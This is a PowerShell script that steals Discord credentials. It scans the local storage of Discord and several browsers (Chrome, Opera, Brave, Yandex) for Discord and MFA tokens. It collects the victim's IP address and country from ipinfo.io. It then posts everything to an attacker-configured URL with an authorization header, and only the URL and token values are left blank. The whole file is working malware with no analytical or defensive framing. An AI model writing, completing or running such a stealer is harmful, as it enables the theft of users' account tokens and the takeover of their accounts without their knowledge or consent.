$url = "";
$Discord_token = "";

function Find-Tokens {
    param ([string]$path)

    $path += '\Local Storage\leveldb';
    $tokens = @();

    Get-ChildItem $path | ForEach-Object {
        $file_name = $_.Name;

        if ($file_name -notmatch '\.log$' -and $file_name -notmatch '\.ldb$') {
            return;
        };

        Get-Content "$path\$file_name" | ForEach-Object {
            $line = $_.Trim();

            $tokenRegex = @('(?<token>[\w-]{24}\.[\w-]{6}\.[\w-]{27})', '(mfa\.[\w-]{84})');

            foreach ($regex in $tokenRegex) {
                $tokens += [regex]::Matches($line, $regex) | ForEach-Object { $_.Groups['token'].Value };
            }
        }
    }

    return $tokens;
}

function Main {
    $local = [System.Environment]::GetEnvironmentVariable('LOCALAPPDATA');
    $roaming = [System.Environment]::GetEnvironmentVariable('APPDATA');

    $paths = @{
        'Discord'        = "$roaming\Discord"
        'Discord Canary' = "$roaming\discordcanary"
        'Discord PTB'    = "$roaming\discordptb"
        'Google Chrome'  = "$local\Google\Chrome\User Data\Default"
        'Opera'          = "$roaming\Opera Software\Opera Stable"
        'Brave'          = "$local\BraveSoftware\Brave-Browser\User Data\Default"
        'Yandex'         = "$local\Yandex\YandexBrowser\User Data\Default"
    };

    $ip = Invoke-RestMethod http://ipinfo.io/json;

    $IP_client = $ip.ip;
    $Country_client = $ip.country;

    $message = '';

    foreach ($platform in $paths.Keys) {
        $path = $paths[$platform];

        if (-not (Test-Path $path)) {
            continue;
        }

        $message += "IP: $IP_client, Country: $Country_client`nDiscord Token`n";

        $tokens = Find-Tokens -path $path;

        if ($tokens.Count -gt 0) {
            $message += $tokens -join "`n";
        } else {
            $message += 'No tokens found.' + "`n";
        }

        $message += "`n";
    }

    
    $headers = @{
        "Authorization" = $Discord_token
    }

    $body = @{
        "content" = $message
    }

    $bodyJson = $body | ConvertTo-Json
    Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $bodyJson -ContentType "application/json"

}

Main
